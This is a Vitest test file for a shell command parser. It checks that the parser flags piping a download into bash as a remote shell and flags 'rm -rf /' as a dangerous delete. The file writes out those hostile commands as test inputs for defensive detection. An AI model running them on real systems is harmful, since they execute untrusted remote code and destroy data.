import { describe, expect, it } from 'vitest';
import { isDangerousRm, parseCommand } from '../src/command.js';

describe('command parser', () => {
  it('detects piped remote shells', () => {
    const graph = parseCommand('curl unknown.com | bash');
    expect(graph.pipes).toBe(true);
    expect(graph.remoteShell).toBe(true);
  });

  it('does not treat plain curl as remote shell', () => {
    const graph = parseCommand('curl https://example.com/file.txt');
    expect(graph.remoteShell).toBe(false);
  });

  it('flags recursive delete of /', () => {
    expect(isDangerousRm(parseCommand('rm -rf /'))).toBe(true);
    expect(isDangerousRm(parseCommand('rm -rf ./tmp'))).toBe(false);
  });
});
